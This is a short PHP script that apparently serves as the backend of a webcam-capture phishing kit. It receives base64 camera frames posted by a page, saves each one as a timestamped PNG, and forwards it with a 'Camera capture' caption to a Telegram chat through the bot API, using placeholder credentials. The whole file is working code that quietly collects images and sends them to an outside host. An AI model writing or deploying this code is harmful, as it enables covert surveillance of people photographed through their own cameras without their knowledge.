 <?php

$botToken = "BOT_TOKEN";
$chatId = "CHAT_ID";

$date = date('dMYHis');

if(!empty($_POST['cat'])){

$imageData = $_POST['cat'];

$filteredData = substr($imageData, strpos($imageData, ",")+1);
$unencodedData = base64_decode($filteredData);

$fileName = "cam".$date.".png";

file_put_contents($fileName, $unencodedData);

$url = "https://api.telegram.org/bot".$botToken."/sendPhoto";

$postFields = [
'chat_id' => $chatId,
'photo' => new CURLFile(realpath($fileName)),
'caption' => "Camera capture ".$date
];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_POSTFIELDS,$postFields);

$result = curl_exec($ch);
curl_close($ch);

echo json_encode(["status"=>"sent"]);

}

?>

